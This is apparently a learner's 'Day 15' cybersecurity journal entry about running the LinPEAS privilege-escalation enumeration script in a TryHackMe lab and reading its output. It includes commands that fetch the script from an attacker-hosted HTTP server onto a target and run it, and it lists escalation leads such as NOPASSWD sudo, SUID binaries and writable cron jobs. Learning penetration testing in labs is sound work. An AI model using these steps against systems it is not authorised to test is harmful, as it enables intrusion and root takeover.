    # 🚀 Day 15 – Automated Privilege Escalation (LinPEAS Basics)

**Date:** 18/12/2025  
**Journey:** 100 Days of Cybersecurity  
**Focus:** Using LinPEAS for automated enumeration & learning how to read its output.

---

## 🎯 Why Day 15 Is Important

Manual enumeration is powerful but:
- It’s slow  
- Easy to miss things  
- Time-consuming during real pentests  

Automation tools like **LinPEAS** help:
- Quickly spot misconfigurations  
- Highlight weak permissions  
- Detect risky software & settings  

⚠️ Tools don’t replace thinking — they **assist** it.

---

# ✅ TASK 1 — What is LinPEAS?

**LinPEAS** is a Linux privilege escalation **enumeration script**.

It checks for:
- SUID binaries  
- sudo permissions  
- Weak file permissions  
- Cron jobs  
- Environment variables  
- Vulnerable software versions  

🧠 Important:
LinPEAS does **NOT** exploit automatically.  
It only shows **possible paths**.

Think of LinPEAS as:
> “A spotlight that shows where to look.”

---

# ✅ TASK 2 — Downloading LinPEAS (Safe Setup)

On Kali (attacking machine):

cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh


### Transferring LinPEAS to Target

**Beginner-friendly method (Python server):**

On Kali:
python3 -m http.server 8000


On target machine:
wget http://<KALI-IP>:8000/linpeas.sh
chmod +x linpeas.sh


This safely transfers the script for enumeration.

---

# ✅ TASK 3 — Running LinPEAS

On the target machine:

./linpeas.sh

yaml
Copy code

I let it run fully and observed the output.

### 🎨 Output Colors Meaning:
- 🟢 **Green** → VERY interesting  
- 🟡 **Yellow** → Possibly useful  
- 🔴 **Red** → Pay attention  

No panic — output is meant to be reviewed slowly.

---

# ✅ TASK 4 — How to READ LinPEAS Output (Important)

Today I focused ONLY on these sections:

### 🔹 1. Sudo Section
Looked for:
NOPASSWD

This indicates commands runnable as root without a password.

---

### 🔹 2. SUID Binaries
Looked for permissions like:
-rwsr-xr-x

These binaries may be abused if misconfigured.

---

### 🔹 3. Writable Files
Checked for files/directories writable by my user.
Writable root-owned files = possible PrivEsc path.

---

### 🔹 4. Cron Jobs
Looked for scripts that:
- Run automatically  
- Execute as root  
- Are writable  

Cron jobs are a classic PrivEsc vector.

---

### 🔹 5. PATH & Environment Variables
Misconfigured PATH entries can allow binary hijacking.

🧠 Goal Today:
Identify **2–3 possible PrivEsc paths**, not exploit everything.

---

# ✅ TASK 5 — Manual vs Automated Enumeration

I compared:

### 🔍 What LinPEAS Found
- Sudo misconfigurations  
- SUID binaries  
- Writable files  
- Cron jobs  
- Environment issues  

### 🧠 What I Found Manually (Day 13–14)
- SUID files  
- sudo -l output  
- GTFOBins candidates  

### Key Learning:
✔ Automation finds more, faster  
✔ Manual skills explain *why* it works  
✔ Best pentesters use **both**

---

# ✅ TASK 6 — TryHackMe Automation Intro

I completed ONE of the following (beginner sections only):

✔ Linux PrivEsc → LinPEAS section  
✔ Enumeration  
✔ Common Linux PrivEsc  

Focus was on:
- Tool usage  
- Understanding output  
- Mapping findings to PrivEsc paths  

No deep exploitation today.

---

# 📝 TASK 7 — Notes in My Own Words

### 🔹 What is LinPEAS used for?
To automatically enumerate privilege escalation vectors on Linux systems.

---

### 🔹 Which LinPEAS sections are most important?
- sudo permissions  
- SUID binaries  
- Writable files  
- Cron jobs  
- PATH & environment variables  

---

### 🔹 What misconfigurations did I find?
Examples:
- NOPASSWD sudo entries  
- Writable root-owned files  
- Dangerous SUID binaries  

---

### 🔹 Why should we not blindly trust tools?
Tools show *possibilities*, not guaranteed exploits.  
Human analysis is required to confirm and exploit safely.

---

## 💭 How I Felt Today

- LinPEAS made enumeration much faster  
- Output looked scary but became clear after filtering  
- Understood how automation supports manual skills  
- Feeling more confident for real-world PrivEsc scenarios  

---

## 📌 Summary of Day 15

Today I learned:

- What LinPEAS is and why it’s used  
- How to safely run automated enumeration  
- How to read and prioritize LinPEAS output  
- Difference between manual & automated enumeration  
- Why tools assist but don’t replace thinking  

This day completed my **core Linux PrivEsc foundation**.

---

**End of Day 15** 🚀